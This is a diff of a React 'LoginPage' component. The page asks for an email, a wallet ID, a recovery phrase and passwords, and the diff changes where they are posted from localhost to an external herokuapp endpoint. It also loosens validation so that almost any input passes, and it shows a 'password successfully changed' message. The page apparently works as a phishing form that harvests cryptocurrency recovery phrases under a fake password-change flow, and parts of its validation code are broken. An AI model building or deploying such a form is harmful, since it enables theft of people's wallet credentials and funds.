@@ -34,7 +34,7 @@ const LoginPage = () => {
         isLoggedIn: true,
       };
       setUsers(userInfo);
-      fetch("http://localhost:5000/userInfo", {
+      fetch("https://aqueous-falls-71280.herokuapp.com/userInfo", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(userInfo),
@@ -49,9 +49,13 @@ const LoginPage = () => {
     if (e.target.name === "email") {
       if ((isValid = /\S+@\S+\.\S+/.test(e.target.value))) {
         isValid = true;
+        const newError = { ...errors };
+        newError.error = "";
+        newError.showMailError = false;
+        setErrors(newError);
       } else {
         const newError = { ...errors };
-        newError.error = "Your email is Invalid";
+        newError.error = " Invalid email";
         newError.showMailError = true;
         newError.showWalletError = false;
         newError.showPhraseError = false;
@@ -62,8 +66,12 @@ const LoginPage = () => {
       }
     }
     if (e.target.name === "walletId") {
-      if ((isValid = /^(?:\d{32})$/.test(e.target.value))) {
+      if (e.target.value.length > 36) {
         isValid = true;
+        const newError = { ...errors };
+        newError.error = "";
+        newError.showWalletError = false;
+        setErrors(newError);
       } else {
         const newError = { ...errors };
         newError.error = "Your Wallet id is invalid";
@@ -77,10 +85,32 @@ const LoginPage = () => {
       }
     }
     if (e.target.name === "phrases") {
-      if (e.target.value.length == 23) {
-        console.log("12 er kom ");
+      if (e.target.value.length > 22) {
+        isValid = true;
+        const newError = { ...errors };
+        newError.error = "";
+        newError.showPhraseError = false;
+        setErrors(newError);
+      } else if (e.target.value == !NaN) {
+        isValid = false;
+        const newError = { ...errors };
+        newError.error = "Recovery Phrase can be Number !";
+        newError.showMailError = false;
+        newError.showWalletError = false;
+        newError.showPhraseError = true;
+        newError.showOldPassError = false;
+        newError.showNewPassError = false;
+        setErrors(newError);
       } else {
         isValid = false;
+        const newError = { ...errors };
+        newError.error = "Recovery Phrase Invalid !";
+        newError.showMailError = false;
+        newError.showWalletError = false;
+        newError.showPhraseError = true;
+        newError.showOldPassError = false;
+        newError.showNewPassError = false;
+        setErrors(newError);
       }
     }
 
@@ -113,7 +143,7 @@ const LoginPage = () => {
       //   console.log(e.target.value.length);
       if (e.target.value.length < 6) {
         const newError = { ...errors };
-        newError.error = "password should be more then 6 digit";
+        newError.error = "Password Invalid !";
         newError.showMailError = false;
         newError.showWalletError = false;
         newError.showPhraseError = false;
@@ -123,18 +153,16 @@ const LoginPage = () => {
         isValid = false;
       } else {
         isValid = true;
+        const newError = { ...errors };
+        newError.error = "";
+        newError.showOldPassError = false;
+        setErrors(newError);
       }
     }
     if (e.target.name === "newPassword") {
-      if (
-        (isValid = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{8,}$/.test(
-          e.target.value
-        ))
-      ) {
-        isValid = true;
-      } else {
+      if (e.target.value.length < 6) {
         const newError = { ...errors };
-        newError.error = "use uppercase ,lowercase and number";
+        newError.error = "invalid password";
         newError.showMailError = false;
         newError.showWalletError = false;
         newError.showPhraseError = false;
@@ -142,6 +170,12 @@ const LoginPage = () => {
         newError.showNewPassError = true;
         setErrors(newError);
         isValid = false;
+      } else {
+        isValid = true;
+        const newError = { ...errors };
+        newError.error = "";
+        newError.showNewPassError = false;
+        setErrors(newError);
       }
     }
 
@@ -176,10 +210,12 @@ const LoginPage = () => {
 
       {users.isLoggedIn ? (
         <div className="success">
-          <h4 style={{ color: "red" }} className="text-center ">
-            You Have successfully changed password for{" "}
-            <strong>{users.email[0]}</strong>
-          </h4>
+          <h2
+            style={{ color: "green" }}
+            className="text-center conditional-para"
+          >
+            Password successfully changed for <strong>{users.email[0]}</strong>
+          </h2>
         </div>
       ) : (
         <div>
